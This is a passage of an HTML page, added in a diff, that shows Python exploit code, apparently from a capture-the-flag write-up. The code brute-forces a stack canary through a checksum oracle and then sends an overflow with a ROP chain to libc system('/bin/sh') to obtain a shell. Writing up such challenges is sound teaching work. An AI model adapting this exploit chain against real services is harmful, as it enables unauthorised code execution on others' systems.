+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span>  <span class="c1"># Preserve pointers to avoid segfaults</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># Address to write length to return</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># Address to write buffer to return</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># File pointer, not used further</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x9000000000</span> <span class="o">+</span> <span class="mh">0xffffff11</span><span class="p">)</span>  <span class="c1"># max_len and curr_len</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># Last block to 1</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">)</span>  <span class="c1"># Length of block, wraps curr_len to 1</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>  <span class="c1"># buffer pointer into canary</span>
+
+        <span class="n">curr</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">((</span><span class="n">char</span><span class="p">,</span> <span class="p">))</span>  <span class="c1"># Since length is 1, we brute force one character</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">gen_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  <span class="c1"># Generate overflow payload</span>
+
+        <span class="c1"># We now overwrite the checksum with a new checksum</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">get_checksum</span><span class="p">(</span><span class="n">curr</span><span class="p">)</span>
+
+        <span class="c1"># Wait for response</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">res</span><span class="p">:</span>
+            <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">()</span>  <span class="c1"># This helped mitigate some weird issues</span>
+
+        <span class="n">send_file</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+        <span class="c1"># If the checksum is valid, add the byte to known</span>
+        <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">res</span> <span class="ow">and</span> <span class="sa">b</span><span class="s2">&quot;checksum&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+            <span class="n">known</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+
+        <span class="c1"># Yeah...</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;FUUUUCK&quot;</span><span class="p">)</span>
+
+<span class="k">return</span> <span class="n">known</span>
+
+<span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">known</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;canary = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="c1"># ---------------------------------- Dropping a shell ----------------------------------</span>
+
+<span class="c1"># Final payload comming up, only necessary values present</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># Return length address</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># Return buffer address</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># Last block, must be true</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">10</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mh">0x80</span><span class="p">)</span>  <span class="c1"># Buffer pointer, must be valid</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>  <span class="c1"># Weird values after canary</span>
+
+<span class="c1"># Main show, rop chain to system</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x27765</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x270e2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)</span>
+
+<span class="c1"># Generate overflow payload</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">gen_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">send_file</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># ROP to system</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+            </div>
+        
+        
+    </div>
+
+    </body>
+</html>
